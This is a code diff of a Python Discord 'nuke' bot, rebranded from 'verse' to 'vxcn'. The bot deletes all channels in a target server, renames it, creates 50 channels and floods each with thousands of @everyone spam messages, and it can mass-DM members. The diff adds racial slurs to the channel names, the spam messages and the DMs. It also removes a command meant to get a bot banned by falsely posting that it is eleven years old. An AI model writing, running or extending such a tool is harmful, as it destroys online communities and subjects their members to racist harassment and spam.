@@ -47,7 +47,7 @@ intents.messages = True
 intents.message_content = True
 
 bot = commands.Bot(command_prefix='$', intents=intents)
-channel_names = ['NUKEDLOL', '9087V1-01816-718SSV', 'lmao', '891076147911', 'RAIDED-BY-VXCN', 'I-RUN-YOU', 'LOL', 'BITCH']
+channel_names = ['NUKEDLOL', 'DUMB-NIGGA', 'VXCN-ON-TOP', 'lmao', '891076147911', 'RAIDED-BY-VXCN', 'vxcn-runs-you', 'LOL', 'SKID']
 
 async def async_input(prompt: str) -> str:
     """Async wrapper for input() to avoid blocking the bot."""
@@ -83,15 +83,15 @@ async def on_ready():
             " 4. Commands              5. Servers             6. Change Bot Token"
         )
         print(" ")
-        print(Fore.MAGENTA + " 7. Gen server invite     8. Unban User (NOT WORKING)")
+        print(Fore.MAGENTA + " 7. Gen server invite     8. Unban User")
         print(" ")
 
-        choice = await async_input(Fore.MAGENTA + "user@verse/~  ")
+        choice = await async_input(Fore.MAGENTA + "user@vxcn/~  ")
 
         os.system('cls' if os.name == 'nt' else 'clear')
 
         if choice == '1':
-            server_id = await async_input(Fore.MAGENTA + "user@verse/ServerID~ ")
+            server_id = await async_input(Fore.MAGENTA + "user@vxcn/ServerID~ ")
             guild = bot.get_guild(int(server_id))
             if guild is None:
                 print(
@@ -274,20 +274,20 @@ async def on_command_error(ctx, error):
 async def startnuke(guild):
     delete_tasks = [channel.delete() for channel in guild.channels]
     await asyncio.gather(*delete_tasks)
-    await guild.edit(name='SERVER NUKED BY VXCN | OWNER IS A BITCH')
+    await guild.edit(name='SERVER NUKED BY VXCN')
 
 
     async def spam_messages(channel):
         for _ in range(10000):
-            await channel.send(f'@everyone I RUN YOU')
-            await channel.send(f'@everyone LOL')
-            await channel.send(f'@everyone raided by vxcnn https://youtube.com/@v.x.c.n 😘😘')
+            await channel.send(f'@everyone I RUN YOU BITCH')
+            await channel.send(f'@everyone LOL DUMB NIGGA')
+            await channel.send(f'@everyone raided by daddy vxcn')
     for i in range(50):
         channel_name = random.choice(channel_names)
         channel = await guild.create_text_channel(channel_name)
         asyncio.create_task(spam_messages(channel))
 
-    print(Fore.MAGENTA + "NUKE STILL RUNNING CLOSE THE PYTHON FILE TO STOP IT")
+    print(Fore.MAGENTA + "[+] Nuke operation completed!")
     await asyncio.sleep(2)
     os.system('cls' if os.name == 'nt' else 'clear')
 
@@ -385,6 +385,7 @@ async def create(ctx, *, name: str):
 
 
 @bot.command()
+@commands.has_permissions(ban_members=True)
 async def ban(ctx):
     noban_ids = [ID, ID]
 
@@ -408,10 +409,6 @@ async def members(ctx):
     total_members = ctx.guild.member_count
 
     await ctx.send(f'The total number of members in this server is: {total_members}')
-
-@bot.command(name='13') # gets the discord bot banned (just like spam report it after it says "im 11", not sure if it gets it banned though 🤷)
-async def command_13(ctx):
-    await ctx.send('im 11 years old! @everyone')
 
 @bot.command()
 async def perms(ctx):
@@ -448,7 +445,7 @@ async def dm(ctx):
         for member in ctx.guild.members:
             if not member.bot:
                 try:
-                    await member.send(f"NIGGA YOU FUCKING SKID, {member.mention} YOUR RAT SERVER IS ABOUT TO GET NUKED!")
+                    await member.send(f"NIGGA  {member.mention} {server_name} IS ABOUT TO GET NUKED!")
                     print(Fore.MAGENTA + f"Sent DM to {member.name}")
                 except discord.Forbidden:
                     print(Fore.MAGENTA + f"Could not send DM to {member.name}. They might have DMs disabled.")
@@ -459,7 +456,7 @@ async def dm(ctx):
 
 token_file = "token.txt"  
 if not os.path.exists(token_file):
-    print(Fore.MAGENTA + "Made with love by verse 💖 ")
+    print(Fore.MAGENTA + "Made with love by vxcn 💖 ")
     print(" ")
     print(" ")
     print(" ")
